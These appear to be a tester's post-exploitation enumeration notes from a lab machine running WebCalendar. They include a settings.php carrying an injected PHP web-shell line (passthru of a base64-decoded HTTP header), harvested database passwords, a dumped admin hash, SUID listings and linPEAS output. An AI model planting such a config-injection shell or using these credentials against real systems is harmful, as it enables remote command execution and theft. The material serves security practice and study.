# 5 box enum www-data

```
# /webcalendar/includes/settings.php
webcalendar-shell# cat settings.php
<?php
/* updated via install/index.php on Sat, 04 Sep 2021 17:03:47 -0400
install_password: 2b793cda199e6d21d3de4c9906254ee8
db_type: mysql
db_host: localhost
db_database: intranet
db_login: wc
db_password: edjfbxMT7KKo2PPC
db_persistent: false
db_cachedir: /tmp
user_inc: user.php
use_http_auth: false
single_user: false
single_user_login: */print(____);passthru(base64_decode($_SERVER[HTTP_CMD]));die;
# end settings.php */
?>

# exploring mysql
www-data@ucal:/tmp$ mysql -u root -p
Enter password:

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| intranet           |
+--------------------+
2 rows in set (0.00 sec)

mysql> select cal_login, cal_passwd from webcal_user;
+-----------+----------------------------------+
| cal_login | cal_passwd                       |
+-----------+----------------------------------+
| admin     | cbb44d79209bee5af34457c3fafd4f1d |
+-----------+----------------------------------+
```

### SuidEnum

```
[~] Custom SUID Binaries (Interesting Stuff)
------------------------------
/usr/sbin/uuidd
/usr/lib/pt_chown
/usr/bin/sudoedit
/usr/bin/mtr
------------------------------
```

### PEAS

```
Linux version 3.0.0-12-server (buildd@crested) (gcc version 4.6.1 (Ubuntu/Linaro 4.6.1-9ubuntu3) ) #20-Ubuntu SMP Fri Oct 7 16:36:30 UTC 2011
Description:    Ubuntu 11.10

╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      -

╣ MySQL version
mysql  Ver 14.14 Distrib 5.1.66, for debian-linux-gnu (x86_64) using readline 6.2

╣ Searching passwords in config PHP files
$db_password = $settings['db_password'];
$db_password = ( $db_password == 'none' ? '' : $db_password );
db_password: edjfbxMT7KKo2PPC
install_password: 2b793cda199e6d21d3de4c9906254ee8
```

```
www-data@ucal:/opt$ ls -la
total 12
drwxr-xr-x  2 root root 4096 Nov 10  2015 .
drwxr-xr-x 23 root root 4096 Jan 14  2013 ..
-rw-r--r--  1 root root  513 Jan 14  2013 interfaces

www-data@ucal:/opt$ cat interfaces
# This file describes the network interfaces available on your system
# and how to activate them. For more information, see interfaces(5).

# The loopback network interface
auto lo
iface lo inet loopback

# The primary network interface
auto eth0
iface eth0 inet static
        address XXXXXX.149
        netmask 255.255.255.0
        network XXXXXX.0
        broadcast XXXXXX.255
        gateway XXXXXX.254
        # dns-* options are implemented by the resolvconf package, if installed
        dns-search local
```
